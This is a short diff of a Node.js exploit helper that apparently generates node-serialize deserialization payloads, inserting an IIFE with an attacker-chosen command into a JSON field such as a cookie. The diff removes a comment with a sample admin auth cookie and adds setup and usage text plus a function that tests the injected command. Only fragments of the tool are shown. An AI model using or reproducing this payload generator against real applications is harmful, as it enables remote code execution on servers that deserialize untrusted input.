@@ -1,6 +1,7 @@
 const s = require('node-serialize')
 const { exec } = require('child_process')
-// auth cookie = {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
+
+// IMPORTANT: To make it work u first ned run the next command:   npm install node-serialize
 
 function help(){
 	console.log(`\n\n\t[!] Usage: node ${process.argv[1]} {command_to_execute} {json} {camp_to_insert_IIFE}\n`)
@@ -8,6 +9,7 @@ function help(){
 	console.log(`\n\t[+] Output: {'user': IIFE_Function, 'password':'test'}\n\n`)
 	exec('exit 1')
 }
+
 
 function testIIFE(cmd){
 	console.log("[+] If the IIFE works you'll see your output command down here:\n-----------------------------------------------------\n")
